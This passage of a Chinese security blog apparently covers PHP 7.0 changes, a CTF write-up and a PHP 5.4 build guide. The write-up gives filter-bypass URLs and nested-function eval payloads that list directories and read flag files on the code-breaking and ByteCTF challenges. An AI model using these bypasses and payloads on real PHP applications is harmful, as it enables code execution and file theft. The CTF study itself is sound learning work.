href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.json-to-jsond"> ¶</a></h2><h2 id="在数值溢出的时候，内部函数将会失败-¶"><a href="#在数值溢出的时候，内部函数将会失败-¶" class="headerlink" title="在数值溢出的时候，内部函数将会失败 ¶"></a>在数值溢出的时候，内部函数将会失败<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.internal-function-failure-overflow"> ¶</a></h2><h2 id="自定义会话处理器的返回值修复-¶"><a href="#自定义会话处理器的返回值修复-¶" class="headerlink" title="自定义会话处理器的返回值修复 ¶"></a>自定义会话处理器的返回值修复<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.fixes-custom-session-handler"> ¶</a></h2><h2 id="相等的元素在排序时的顺序问题-¶"><a href="#相等的元素在排序时的顺序问题-¶" class="headerlink" title="相等的元素在排序时的顺序问题 ¶"></a>相等的元素在排序时的顺序问题<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.sort-order"> ¶</a></h2><h2 id="错误的使用-break-和-switch-语句-¶"><a href="#错误的使用-break-和-switch-语句-¶" class="headerlink" title="错误的使用 break 和 switch 语句 ¶"></a>错误的使用 break 和 switch 语句<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.break-continue"> ¶</a></h2><h2 id="Mhash-不再是一个单独的扩展了-¶"><a href="#Mhash-不再是一个单独的扩展了-¶" class="headerlink" title="Mhash 不再是一个单独的扩展了 ¶"></a>Mhash 不再是一个单独的扩展了<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.mhash"> ¶</a></h2><h2 id="标量类型声明-¶"><a href="#标量类型声明-¶" class="headerlink" title="标量类型声明 ¶"></a>标量类型声明<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.scalar-type-declarations"> ¶</a></h2><h2 id="返回值类型声明-¶"><a href="#返回值类型声明-¶" class="headerlink" title="返回值类型声明 ¶"></a>返回值类型声明<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations"> ¶</a></h2><h2 id="生成器可以返回表达式-¶"><a href="#生成器可以返回表达式-¶" class="headerlink" title="生成器可以返回表达式 ¶"></a>生成器可以返回表达式<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.generator-return-expressions"> ¶</a></h2><h2 id="允许在克隆表达式上访问对象成员-¶"><a href="#允许在克隆表达式上访问对象成员-¶" class="headerlink" title="允许在克隆表达式上访问对象成员[ ¶]("></a>允许在克隆表达式上访问对象成员[ ¶](</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/" data-id="cm0kx5k580007o8dk9h769jg6" data-title="PHP7.0特性" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-循环嵌套函数GetShell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T05:44:36.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/rce/">rce</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/">循环嵌套函数GetShell</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="函数妙用"><a href="#函数妙用" class="headerlink" title="函数妙用"></a>函数妙用</h1><h2 id="code-breaking-easy-phplimit函数的巧妙搭配"><a href="#code-breaking-easy-phplimit函数的巧妙搭配" class="headerlink" title="code-breaking_easy-phplimit函数的巧妙搭配"></a>code-breaking_easy-phplimit函数的巧妙搭配</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></li>
</ul>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;../&#x27;</span>));<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../flag_phpbyp4ss&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br></pre></td></tr></table></figure>

<h2 id="ByteCTF-boring-code"><a href="#ByteCTF-boring-code" class="headerlink" title="ByteCTF boring_code"></a>ByteCTF boring_code</h2><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><p><a target="_blank" rel="noopener" href="http://www.guildhab.top/?p=1077">http://www.guildhab.top/?p=1077</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></p>
</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\//i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_valid_url</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error: host not allowed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error: invalid url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.第一步</p>
<p>第一步需要绕过<code>preg_match</code>的检测，网上见到的payload都是通过购买域名，url跳转等方法进行绕过。其实可以通过代码绕过。</p>
<p><strong>我的方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://data:@baidu.com/baidu.com,phpinfo()</span><br></pre></td></tr></table></figure>

<p><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p>
<p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_1.png"></p>
<p><strong>其他方法</strong></p>
<ul>
<li><p>购买一个 xxxxbaidu.com 的域名</p>
</li>
<li><p>百度网盘链接</p>
<p><strong>这种方法的思路是将恶意代码上传到百度网盘 , 然后通过百度网盘的下载链接来绕过 baidu.com 的主机名限制 .</strong></p>
<ol>
<li><p><strong>将一个恶意脚本上传到百度网盘( 这里以 phpinfo() 为例 )</strong></p>
<p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_3.png"></p>
</li>
<li><p><strong>通过开发者工具( F12 ) , 在 network 选项卡中可以找到目标文件的链接</strong></p>
<p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_2.png"></p>
</li>
</ol>
</li>
<li><p>百度贴吧（<a target="_blank" rel="noopener" href="https://www.4xseo.com/marketing/1280/">https://www.4xseo.com/marketing/1280/</a></p>
</li>
<li><p>百度爬虫</p>
<p>其原理大概就是 : <strong>百度的搜索引擎爬虫会爬到你的个人站点 , 当你在百度上点击自己站点时 , 并不是直接访问 . 而是利用百度的重定向机制 , 将你的网址转换成<code>http://www.baidu.com/link?url=xxxxxxxxxxxxxxx</code> , 通过这个链接可以绕过第一层防御并且拿到你站点上的恶意脚本 .</strong></p>
</li>
</ul>
<p>2.第二步</p>
<p>我们要获取<code>.</code>，可以通过获取<code>.</code>的ascii码，然后通过<code>chr</code>函数得到。写了个脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$functions</span>=<span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFucntionParameter1</span>(<span class="params"><span class="variable">$func</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ReflectionFunc</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionFunction</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="variable">$nums</span>=<span class="variable">$ReflectionFunc</span>-&gt;<span class="title function_ invoke__">getNumberOfRequiredParameters</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$nums</span>===<span class="number">1</span>)&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$func</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    	<span class="comment">#@print_r($func());</span></span><br><span class="line">    	<span class="comment">#echo &quot;\n#####\n&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$vul</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|readline/i&#x27;</span>, <span class="variable">$vul</span>))&#123;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">getFucntionParameter1</span>(<span class="variable">$vul</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要使用了反射检测函数的参数。</p>
<p><strong>payload</strong></p>
<ul>
<li><p><code>crypt</code>函数的返回值最后一位可能为<code>.</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))))<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>()))))))));</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>localeconv</code>函数</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/" data-id="cm0kx5k5c000ko8dk3lqpb3w2" data-title="循环嵌套函数GetShell" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-源码编译安装php和apache" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T04:54:18.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/">源码编译安装php和apache</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一个漏洞，需要 php5.4 的 lamp 环境，但网上没有找到很好的环境，所以自己搭建了一个。</p>
<h1 id="编译安装PHP"><a href="#编译安装PHP" class="headerlink" title="编译安装PHP"></a>编译安装PHP</h1><h2 id="前置环境配置"><a href="#前置环境配置" class="headerlink" title="前置环境配置"></a>前置环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">apt-get install docker.io</span><br><span class="line"><span class="comment"># pull ubuntu:16.04</span></span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker run -it -p8888:8888 ubuntu:16.04 /bin/bash</span><br><span class="line"><span class="comment">#更换源</span></span><br><span class="line"><span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IyMgTm90ZSwgdGhpcyBmaWxlIGlzIHdyaXR0ZW4gYnkgY2xvdWQtaW5pdCBvbiBmaXJzdCBib290IG9mIGFuIGluc3RhbmNlDQojIyBtb2RpZmljYXRpb25zIG1hZGUgaGVyZSB3aWxsIG5vdCBzdXJ2aXZlIGEgcmUtYnVuZGxlLg0KIyMgaWYgeW91IHdpc2ggdG8gbWFrZSBjaGFuZ2VzIHlvdSBjYW46DQojIyBhLikgYWRkICdhcHRfcHJlc2VydmVfc291cmNlc19saXN0OiB0cnVlJyB0byAvZXRjL2Nsb3VkL2Nsb3VkLmNmZw0KIyMgICAgIG9yIGRvIHRoZSBzYW1lIGluIHVzZXItZGF0YQ0KIyMgYi4pIGFkZCBzb3VyY2VzIGluIC9ldGMvYXB0L3NvdXJjZXMubGlzdC5kDQojIyBjLikgbWFrZSBjaGFuZ2VzIHRvIHRlbXBsYXRlIGZpbGUgL2V0Yy9jbG91ZC90ZW1wbGF0ZXMvc291cmNlcy5saXN0LnRtcGwNCg0KIyBTZWUgaHR0cDovL2hlbHAudWJ1bnR1LmNvbS9jb21tdW5pdHkvVXBncmFkZU5vdGVzIGZvciBob3cgdG8gdXBncmFkZSB0bw0KIyBuZXdlciB2ZXJzaW9ucyBvZiB0aGUgZGlzdHJpYnV0aW9uLg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQoNCiMjIE1ham9yIGJ1ZyBmaXggdXBkYXRlcyBwcm9kdWNlZCBhZnRlciB0aGUgZmluYWwgcmVsZWFzZSBvZiB0aGUNCiMjIGRpc3RyaWJ1dGlvbi4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC11cGRhdGVzIG1haW4NCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1DQojIyB0ZWFtLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIHVuaXZlcnNlIFdJTEwgTk9UIHJlY2VpdmUgYW55DQojIyByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUgc2VjdXJpdHkgdGVhbS4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsIHVuaXZlcnNlDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1IA0KIyMgdGVhbSwgYW5kIG1heSBub3QgYmUgdW5kZXIgYSBmcmVlIGxpY2VuY2UuIFBsZWFzZSBzYXRpc2Z5IHlvdXJzZWxmIGFzIHRvDQojIyB5b3VyIHJpZ2h0cyB0byB1c2UgdGhlIHNvZnR3YXJlLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIA0KIyMgbXVsdGl2ZXJzZSBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUNCiMjIHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgbXVsdGl2ZXJzZQ0KIyBkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtdWx0aXZlcnNlDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gdGhlICdiYWNrcG9ydHMnDQojIyByZXBvc2l0b3J5Lg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBtYXkgbm90IGhhdmUgYmVlbiB0ZXN0ZWQgYXMNCiMjIGV4dGVuc2l2ZWx5IGFzIHRoYXQgY29udGFpbmVkIGluIHRoZSBtYWluIHJlbGVhc2UsIGFsdGhvdWdoIGl0IGluY2x1ZGVzDQojIyBuZXdlciB2ZXJzaW9ucyBvZiBzb21lIGFwcGxpY2F0aW9ucyB3aGljaCBtYXkgcHJvdmlkZSB1c2VmdWwgZmVhdHVyZXMuDQojIyBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIGJhY2twb3J0cyBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcNCiMjIG9yIHVwZGF0ZXMgZnJvbSB0aGUgVWJ1bnR1IHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtYmFja3BvcnRzIG1haW4gcmVzdHJpY3RlZCB1bml2ZXJzZSBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLWJhY2twb3J0cyBtYWluIHJlc3RyaWN0ZWQgdW5pdmVyc2UgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gQ2Fub25pY2FsJ3MNCiMjICdwYXJ0bmVyJyByZXBvc2l0b3J5Lg0KIyMgVGhpcyBzb2Z0d2FyZSBpcyBub3QgcGFydCBvZiBVYnVudHUsIGJ1dCBpcyBvZmZlcmVkIGJ5IENhbm9uaWNhbCBhbmQgdGhlDQojIyByZXNwZWN0aXZlIHZlbmRvcnMgYXMgYSBzZXJ2aWNlIHRvIFVidW50dSB1c2Vycy4NCiMgZGViIGh0dHA6Ly9hcmNoaXZlLmNhbm9uaWNhbC5jb20vdWJ1bnR1IHhlbmlhbCBwYXJ0bmVyDQojIGRlYi1zcmMgaHR0cDovL2FyY2hpdmUuY2Fub25pY2FsLmNvbS91YnVudHUgeGVuaWFsIHBhcnRuZXINCg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IHVuaXZlcnNlDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSB1bml2ZXJzZQ0KIyBkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IG11bHRpdmVyc2UNCiMgZGViLXNyYyBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtc2VjdXJpdHkgbXVsdGl2ZXJzZQ==&quot;</span>|<span class="built_in">base64</span> -d &gt; /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装必要环境</span></span><br><span class="line">apt-get install vim wget net-tools curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装编译php需要的环境 eg:https://github.com/php/php-src#building-php-source-code</span></span><br><span class="line"><span class="comment"># 安装apache2-dev是因为php只能在编译时载入apache模块，所以我们需要--with-apxs2参数</span></span><br><span class="line">apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev apache2 apache2-dev</span><br></pre></td></tr></table></figure>

<h2 id="下载并编译安装php"><a href="#下载并编译安装php" class="headerlink" title="下载并编译安装php"></a>下载并编译安装php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载解压php-5.4.45 eg: https://www.php.net/releases/</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">wget https://www.php.net/distributions/php-5.4.45.tar.bz2</span><br><span class="line">tar jxvf php-5.4.45.tar.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译php-5.4.45  参数可通过 ./configure -h 查看</span></span><br><span class="line"><span class="built_in">cd</span> php-5.4.45</span><br><span class="line">./buildconf --force</span><br><span 